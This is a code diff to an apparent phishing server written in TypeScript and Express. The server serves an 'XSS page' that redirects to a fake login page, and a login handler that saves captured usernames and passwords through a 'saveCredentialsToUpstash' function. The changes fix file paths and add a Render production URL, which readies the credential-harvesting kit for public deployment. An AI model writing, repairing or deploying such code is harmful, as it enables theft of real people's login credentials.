@@ -7,15 +7,15 @@ import dotenv from 'dotenv';
 dotenv.config();
 
 const app = express();
-const PORT: number = 3000;
+const PORT: number = parseInt(process.env.PORT || '3000');
 
 // Middleware to parse form data
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
 // Serve static files (CSS, images, etc.)
-app.use(express.static('public'));
-app.use('/assets', express.static('src/assets'));
+app.use(express.static(path.join(__dirname, '../public')));
+app.use('/assets', express.static(path.join(__dirname, '../public/assets')));
 
 const tentativas: number = 5;
 
@@ -59,7 +59,7 @@ const saveCredentialsToUpstash = async (usuario: string, senha: string): Promise
 // Route for the XSS page (initial page)
 app.get('/', (req: Request, res: Response): void => {
     try {
-        const htmlTemplate = fs.readFileSync(path.join(__dirname, '../public/xss_page.html'), 'utf8');
+        const htmlTemplate = fs.readFileSync(path.join(__dirname, '../xss_page.html'), 'utf8');
         let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
         htmlWithData = htmlWithData.replace('{{error_message}}', '');
 
@@ -73,7 +73,7 @@ app.get('/', (req: Request, res: Response): void => {
 // Route for the fake page (redirected from XSS page)
 app.get('/fake_page.html', (req: Request, res: Response): void => {
     try {
-        const htmlTemplate = fs.readFileSync(path.join(__dirname, '../public/fake_page.html'), 'utf8');
+        const htmlTemplate = fs.readFileSync(path.join(__dirname, '../fake_page.html'), 'utf8');
         let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
 
         // Show error message if there's an error parameter
@@ -103,8 +103,10 @@ app.post('/login', async (req: Request, res: Response): Promise<void> => {
 });
 
 app.listen(PORT, (): void => {
-    const url = `http://localhost:${PORT}`;
-    console.log(`Servidor rodando em ${url}`);
+    const url = process.env.NODE_ENV === 'production' 
+        ? `https://your-app-name.onrender.com` 
+        : `http://localhost:${PORT}`;
+    console.log(`🚀 Servidor rodando em ${url}`);
     console.log('Iniciando com XSS page, que redirecionará para fake page e depois para link externo...');
     
 });
